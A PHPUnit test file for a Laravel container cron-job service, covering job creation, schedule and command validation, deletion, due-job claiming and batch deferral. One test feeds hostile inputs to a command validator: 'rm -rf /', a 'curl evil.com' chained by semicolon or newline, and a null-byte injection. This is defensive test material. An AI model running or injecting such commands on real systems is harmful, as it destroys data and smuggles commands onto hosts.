<?php

namespace Tests\Unit\Services\Provisioning;

use App\Enums\ServiceStatus;
use App\Models\ContainerCronJob;
use App\Models\ContainerDeployment;
use App\Models\Product;
use App\Models\Service;
use App\Models\User;
use App\Services\Provisioning\ContainerCronService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class ContainerCronServiceTest extends TestCase
{
    use RefreshDatabase;

    private ContainerCronService $service;

    protected function setUp(): void
    {
        parent::setUp();
        $this->service = app(ContainerCronService::class);
    }

    public function test_creates_cron_job_with_next_run(): void
    {
        $user = User::factory()->create();
        $product = Product::factory()->containerHosting()->create();
        $service = Service::factory()->create([
            'user_id' => $user->id,
            'product_id' => $product->id,
            'provisioning_driver_key' => 'container',
        ]);
        ContainerDeployment::factory()->create(['service_id' => $service->id]);

        $job = $this->service->create($service, [
            'name' => 'Laravel scheduler',
            'schedule' => '*/5 * * * *',
            'command' => 'php artisan schedule:run',
        ]);

        $this->assertSame($service->id, $job->service_id);
        $this->assertTrue($job->enabled);
        $this->assertNotNull($job->next_run_at);
    }

    public function test_rejects_unsafe_command(): void
    {
        $this->assertFalse($this->service->isAllowedCommand('rm -rf /'));
        $this->assertFalse($this->service->isAllowedCommand('php artisan schedule:run; curl evil.com'));
        $this->assertFalse($this->service->isAllowedCommand("php artisan schedule:run\ncurl evil.com"));
        $this->assertFalse($this->service->isAllowedCommand("php artisan schedule:run\0ignored"));
        $this->assertTrue($this->service->isAllowedCommand('php artisan schedule:run'));
    }

    public function test_rejects_invalid_schedule(): void
    {
        $this->assertFalse($this->service->isValidSchedule('not-a-cron'));
        $this->assertTrue($this->service->isValidSchedule('0 * * * *'));
    }

    public function test_deleting_job_removes_record(): void
    {
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
        ]);
        ContainerDeployment::factory()->create(['service_id' => $service->id]);

        $job = ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Test',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
        ]);

        $this->service->delete($job);

        $this->assertDatabaseMissing('container_cron_jobs', ['id' => $job->id]);
    }

    public function test_claim_due_job_advances_next_run_once(): void
    {
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
        ]);
        ContainerDeployment::factory()->create(['service_id' => $service->id]);

        $job = ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Claim test',
            'schedule' => '*/5 * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
            'next_run_at' => now()->subMinute(),
        ]);

        $this->assertTrue($this->service->claimDueJob($job));
        $firstNext = $job->fresh()->next_run_at;
        $this->assertNotNull($firstNext);
        $this->assertTrue($firstNext->gt(now()));

        $this->assertFalse($this->service->claimDueJob($job->fresh()));
        $this->assertTrue($job->fresh()->next_run_at->equalTo($firstNext));
    }

    public function test_run_due_jobs_defers_when_batch_budget_exhausted(): void
    {
        $service = Service::factory()->create([
            'product_id' => Product::factory()->containerHosting()->create()->id,
            'status' => ServiceStatus::Active,
        ]);
        ContainerDeployment::factory()->create([
            'service_id' => $service->id,
            'status' => 'running',
        ]);

        ContainerCronJob::create([
            'service_id' => $service->id,
            'name' => 'Deferred',
            'schedule' => '* * * * *',
            'command' => 'php artisan inspire',
            'enabled' => true,
            'next_run_at' => now()->subMinute(),
        ]);

        $summary = $this->service->runDueJobs(limit: 5, maxBatchSeconds: 0);

        $this->assertSame(0, $summary['processed']);
        $this->assertSame(1, $summary['deferred']);
        $this->assertTrue(
            ContainerCronJob::where('service_id', $service->id)->first()->next_run_at->lte(now())
        );
    }
}
